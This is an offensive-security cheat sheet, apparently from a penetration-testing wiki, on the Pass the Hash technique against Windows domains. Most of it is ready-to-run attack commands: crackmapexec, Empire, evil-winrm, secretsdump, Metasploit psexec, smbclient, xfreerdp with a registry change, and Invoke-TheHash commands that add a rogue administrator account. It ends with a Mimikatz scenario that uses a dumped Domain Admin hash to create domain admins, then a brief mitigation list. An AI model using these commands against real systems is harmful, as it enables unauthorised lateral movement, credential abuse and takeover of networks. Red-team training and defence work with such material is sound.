description: https://attack.mitre.org/techniques/T1550/002/

# Pass The Hash

**ATT\&CK ID:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/)

**Permissions Required:** <mark style="color:green;">**Valid account hash**</mark>

#### Description

Adversaries may "pass the hash" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's clear text password. This method bypasses standard authentication steps that require a clear text password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.

[\[Source\]](https://attack.mitre.org/techniques/T1550/002/)

## Techniques (Linux)

### Crackmapexec

```bash
crackmapexec smb <IP> -u <User> -H <NTLM>
crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'

# local account login
crackmapexec smb <IP> -u <User> -H <NTLM> --local-auth
crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71' --local-auth
```

![](../../../Assets/Pasted%20image%2020250619215540.png)

### Empire

```bash
usemodule lateral_movement/invoke_smbexec

# Parameters
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set ComputerName '10.10.10.100'
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Domain security.local
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Listener http
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Hash 58a478135a93ac3bf058a5ea0e8fdb71
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Username moe
(Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > execute
```

![](../../../Assets/Pasted%20image%2020250619215550.png)

### Evil-WinRM

```bash
evil-winrm -i <IP> -u <User> -H <NThash>
evil-winrm -i '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
```

![](../../../Assets/Pasted%20image%2020250619215558.png)

### LDAP

```bash
secretsdump.py <User>@<IP> -hashes <Hash>
secretsdump.py moe@10.10.10.100 -hashes aad321b35b51404eeaad982b5b51404ee:b38ff50264b7458734d82c69794a4d8
```

![](../../../Assets/Pasted%20image%2020250619215610.png)

### Metasploit

```bash
use exploit/windows/smb/psexec

# Set hash as password
set smbpass "aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71"
```

![](../../../Assets/Pasted%20image%2020250619215617.png)

### Smbclient

```bash
smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
smbclient '//10.0.0.100/IT' -U 'moe' --pw-nt-hash '58a478135a93ac3bf058a5ea0e8fdb71' -W 'security.local'
```

### xFreeRDP

This method requires "Restricted Admin Mode" enabled on the target system.

```bash
xfreerdp /v:10.10.10.100 /u:moe /pth:58a478135a93ac3bf058a5ea0e8fdb71
```

```bash
# Enable restricted admin mode, requires elevated permissions.
crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

## Techniques (Windows)

### Invoke-TheHash

```powershell
# SMB Options
# Check SMB signing
Invoke-TheHash -Type SMBExec -Target '[IP]'
Invoke-TheHash -Type SMBExec -Target [CIDR]

# Check for command execution 
Invoke-TheHash -Type SMBExec -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
Invoke-TheHash -Type SMBExec -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

# Pass hash to target and execute specified command 
Invoke-TheHash -Type SMBExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]' 
Invoke-TheHash -Type SMBExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

 # Enumerate SMB Shares / Users / Net Sessions 
Invoke-SMBEnum -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
Invoke-SMBEnum -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

# WMI Options
# Check for command execution (WMI)
Invoke-TheHash -Type WMIExec -Username '[Username]' -Hash '[NTLM-Hash]' -Target '[IP]'
Invoke-TheHash -Type WMIExec -Username '[Username]' -Hash '[NTLM-Hash]' -Target [CIDR]

 # Pass hash to target and execute specified command (WMI)
Invoke-TheHash -Type WMIExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
Invoke-TheHash -Type WMIExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

```

### Mimikatz

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTLM> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:powershell.exe"'
```

## Scenario

In the following scenario we have compromised a Windows 2019 member server SRV01.Security.local and escalated privileges to the local administrator account. We then dumped credentials from LSASS memory using `Mimikatz` and have obtained the NTLM password hash for the Domain Administrator "Moe".

#### LSASS Memory Credential Dumping

We are working as the local administrator on SRV01 so we are unable to perform administrative function on the Domain.

As we have the NTLM hash for the Domain Administrator "Moe" we are able to use Mimikatz to Pass-The-Hash to a new process such as PowerShell.

By doing so we are able to then use the newly spawned PowerShell process to perform domain administrative functions.

Under our local administrator account and as expected, we are unable to create a new domain user.

![](../../../Assets/Pasted%20image%2020250619215721.png)

Next we Pass-The-Hash for the Domain Administrator Moe:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:powershell.exe"'
```

![](../../../Assets/Pasted%20image%2020250619215736.png)

Which opens a new PowerShell process for us. Where, we still notice we are running as the local administrator on the member server SRV01 however, we now have the ability to work as the Domain Administrator Moe and create a new domain user and add them to the "Domain Admins" group.

![](../../../Assets/Pasted%20image%2020250619215745.png)

## Mitigation

* Enable Windows Credential Guard
* Deploy Microsoft LAPS
* Disable LM/NTLM authentication in the environment
* Reduce amount of cached logon passwords stored
* Limit administrative users in the domain / locally.

### Further Reading

**Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques v2:** [Download](https://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating-Pass-the-Hash-Attacks-and-Other-Credential-Theft-Version-2.pdf)